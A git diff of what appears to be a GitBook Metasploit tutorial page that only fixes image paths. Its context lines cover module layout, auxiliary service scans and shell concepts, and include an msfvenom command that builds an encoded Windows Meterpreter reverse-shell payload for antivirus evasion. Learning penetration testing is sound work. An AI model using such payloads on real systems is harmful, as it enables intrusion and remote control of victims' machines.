@@ -22,7 +22,7 @@ description: In the cover the baisc of MetaSploit
 
 ## Phases Of MetaSploit
 
-<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 ### Installation
 
@@ -71,7 +71,7 @@ service postsql status
 ls /usr/share/metasploit-framework
 ```
 
-<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 > MSF File system is intutive and organized by directories & Modules are stored under.
 
@@ -82,7 +82,7 @@ auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
 
 ```
 
-<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 ### MetaSploit Framework Architecture
 
@@ -93,7 +93,7 @@ auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
 * So usr/share/metasploit-framework
 * As there are many frameworks
 
-<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption><p>MetaSploit FrameWork Architecture by oreilly.com</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption><p>MetaSploit FrameWork Architecture by oreilly.com</p></figcaption></figure>
 
 ### MetaSploit Variables
 
@@ -109,9 +109,9 @@ auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
 
 <table data-header-hidden><thead><tr><th valign="top"></th><th></th></tr></thead><tbody><tr><td valign="top">Syntax &#x26; Commands</td><td></td></tr><tr><td valign="top">help</td><td>#help</td></tr><tr><td valign="top">Show versions</td><td># version</td></tr><tr><td valign="top">Show help</td><td>#show –h</td></tr><tr><td valign="top">show all</td><td>#Show all</td></tr><tr><td valign="top">let know what option is availability</td><td># Options</td></tr><tr><td valign="top">let know the advance functionality of that Metasploit service.</td><td># Advance</td></tr><tr><td valign="top">Shows the exploit</td><td># show exploits</td></tr><tr><td valign="top"> </td><td>#search &#x3C;STRING></td></tr><tr><td valign="top">set something</td><td># use &#x3C;MODULE_NAME></td></tr><tr><td valign="top">set something</td><td># set &#x3C;OPTION></td></tr><tr><td valign="top">set something globally</td><td>#setg</td></tr><tr><td valign="top">Run &#x26; execute the exploit</td><td># execute / run</td></tr><tr><td valign="top">Records the sessions and show the available sessions</td><td># Sessions</td></tr><tr><td valign="top">Connect to the target</td><td># Connect</td></tr></tbody></table>
 
-<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 ### MetaSploit BackEnd DataBase
 
@@ -138,13 +138,13 @@ search -u #update itself
 
 ```
 
-<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 ```
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 ### MetaSploit Payload
 
@@ -161,13 +161,13 @@ OR
 
 ```
 
-<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
 ```
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 ### MetaSploit WorkSpaces
 
@@ -185,7 +185,7 @@ db_status
 
 ```
 
-<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
 ```
 workspace 
@@ -196,7 +196,7 @@ workspace -a hasanrehni
 
 ```
 
-<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 ```
 #Change workspace
@@ -251,13 +251,13 @@ use 0
 options
 ```
 
-<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 ```
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
 ### SMB Auxiliary Service Enumeration
 
@@ -267,13 +267,13 @@ use 0
 options
 ```
 
-<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
 ```
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
 ### SAMBA Auxiliary Service Enumeration
 
@@ -284,7 +284,7 @@ options
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
 
 ### RDP Auxiliary Service Enumeration
 
@@ -295,7 +295,7 @@ options
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
 ### SSH Auxiliary Service Enumeration
 
@@ -311,17 +311,17 @@ options
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 ```
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 > More ssh scan
 
-<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
 ### MYSQL Auxiliary Service Enumeration
 
@@ -332,7 +332,7 @@ options
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 ### SMTP Auxiliary Service Enumeration
 
@@ -343,11 +343,11 @@ options
 run
 ```
 
-<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 ## SHELL ENVIROMENT
 
-<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 #### Executable Formats
 
@@ -401,7 +401,7 @@ Shell >>  cmd || /bin/bash
 #dir ipconfig.exe
 ```
 
-<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
 ### Blind Shell
 
@@ -410,7 +410,7 @@ Shell >>  cmd || /bin/bash
 
 Bind >>  attacker will connect to victim
 
-<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 ### Reverse Shell
 
@@ -419,7 +419,7 @@ Bind >>  attacker will connect to victim
 
 > Reverse shell >>  home delivery >>  victim will connect to attacker
 
-<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
 
 ### Shells Terminologies
 
@@ -576,7 +576,7 @@ Final size of powershell file: 2503 bytes
 * Before encoders  & After encoders diffeswebsite
 * The  only different is in malicious pieces of code.
 
-<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.130 lport=5555 -f psh -e x64/xor_context -i 5
@@ -601,7 +601,7 @@ If not found then is called as bypass signature detection.
 msfvenom -l nops
 ```
 
-<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
 
 ### Platfrom
 
